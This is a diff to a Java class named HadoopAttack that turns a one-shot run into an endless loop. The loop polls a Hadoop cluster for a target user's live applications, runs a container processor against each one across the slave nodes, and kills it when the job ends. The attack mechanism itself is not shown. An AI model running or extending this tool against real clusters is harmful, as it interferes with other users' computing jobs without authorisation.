@@ -6,6 +6,7 @@ import java.util.List;
 import com.hadoop.common.Application;
 import com.hadoop.common.ContainerProcessor;
 import com.hadoop.common.Tools;
+
 /**
  * 
  * @author Admin
@@ -19,25 +20,39 @@ public class HadoopAttack {
 	private static String user = "hadoop";
 
 	public static void main(String[] args) {
-		if (args.length == 1) {
-			user = args[0];
-		}else if(args.length == 3){
+		if (args.length == 3) {
 			user = args[0];
 			masterUrl = args[1];
 			clusterUrl = args[2];
-		}else{
-			System.out.println("args: user masterurl clusterurl");
-			return;
 		}
-		List<Application> appList = Tools.getAppList(masterUrl, encoding);
-		for (Application app : appList) {
-			if (app.getUser().equals(user) && app.getStatus().equals("RUNNING")) {
-				System.out.println("Get App Id:" + app.getId());
-				ArrayList<String> slavers = Tools.getSlaverList(clusterUrl,
-						encoding);
-				ContainerProcessor containerProcessor = new ContainerProcessor(
-						app, slavers);
-				containerProcessor.run();
+		while (true) {
+			List<Application> appList = Tools.getAppList(masterUrl, encoding);
+			for (Application app : appList) {
+				if (app.getUser().equals(user)
+						&& !app.getStatus().equals("FINISHED")
+						&& !app.getStatus().equals("FAILED")) {
+					System.out.println("Get App Id:" + app.getId());
+					ArrayList<String> slavers = Tools.getSlaverList(clusterUrl,
+							encoding);
+					ContainerProcessor containerProcessor = new ContainerProcessor(
+							app, slavers);
+					containerProcessor.run();
+					boolean running = true;
+					while (running) {
+						List<Application> appList2 = Tools.getAppList(
+								masterUrl, encoding);
+						for (Application app2 : appList2) {
+							if (app.getId().equals(app2.getId())
+									&& (app2.getStatus().equals("FINISHED") || app2
+											.getStatus().equals("FAILED"))) {
+								containerProcessor.kill();
+								System.out.println(app.getId() + " has Done!");
+								running = false;
+								break;
+							}
+						}
+					}
+				}
 			}
 		}
 
